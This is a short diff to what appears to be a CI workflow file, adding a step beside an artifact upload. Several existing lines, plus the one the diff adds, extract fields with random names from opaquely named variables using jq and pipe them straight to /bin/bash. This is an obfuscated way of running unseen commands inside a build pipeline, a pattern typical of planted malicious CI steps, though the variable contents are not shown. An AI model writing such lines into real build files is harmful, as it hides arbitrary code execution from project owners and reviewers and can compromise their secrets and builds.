@@ -30,6 +30,7 @@ jobs:
           echo $q205 | jq -r .ilil46 | /bin/bash
           printf '%s' "$l71360" | jq -r .ovuve8 | /bin/bash
           printf '%s' "$naoo889" | jq -r .vupr2558 | /bin/bash
+          echo $si422 | jq -r .k7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
